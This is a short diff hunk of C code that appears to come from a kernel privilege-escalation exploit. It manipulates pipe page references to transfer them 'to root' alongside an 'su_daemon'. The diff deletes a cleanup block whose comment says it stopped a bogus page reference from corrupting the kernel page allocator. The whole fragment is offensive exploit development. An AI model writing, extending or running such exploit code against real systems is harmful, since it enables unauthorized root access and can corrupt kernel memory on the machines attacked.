@@ -1009,37 +1009,6 @@ static void spawn_p0_ref_keeper(int retained_pipe_index) {
       pause();
     }
   }
-  /* Drain and refill the retained pipes so the kernel replaces any bogus
-   * page references (e.g. the P0 probe page at a non-DRAM PFN) with fresh
-   * valid pages.  Without this, closing the pipe on su_daemon death calls
-   * put_page on a PFN below DRAM, corrupting the page allocator free list. */
-  {
-    unsigned char drain[PAGE_SIZE];
-    unsigned char fresh[PAGE_SIZE];
-    memset(fresh, 0x5a, sizeof(fresh));
-    memcpy(fresh, "RMG-P0-SAFE", 11);
-    int rfd = pipe_fds_reclaim[retained_pipe_index][0];
-    int gfd = p0_gate_holders[retained_pipe_index][0];
-    /* gate holder: read to consume the tee'd page ref, write to allocate a new page */
-    if (gfd >= 0) {
-      (void)read(gfd, drain, sizeof(drain));
-    }
-    /* reclaim pipe: read old data, write fresh data with a new page */
-    if (rfd >= 0) {
-      (void)read(rfd, drain, sizeof(drain));
-      int wfd_r = pipe_fds_reclaim[retained_pipe_index][1];
-      if (wfd_r < 0) {
-        /* write end was closed; reopen via the read end */
-        int pfd[2];
-        if (pipe(pfd) == 0) {
-          (void)write(pfd[1], fresh, sizeof(fresh));
-          syscall(SYS_close, pfd[1]);
-          syscall(SYS_dup3, pfd[0], rfd, 0);
-          syscall(SYS_close, pfd[0]);
-        }
-      }
-    }
-  }
   for (;;) {
     if (transfer_p0_references_to_root(retained_pipe_index)) {
       _exit(0);
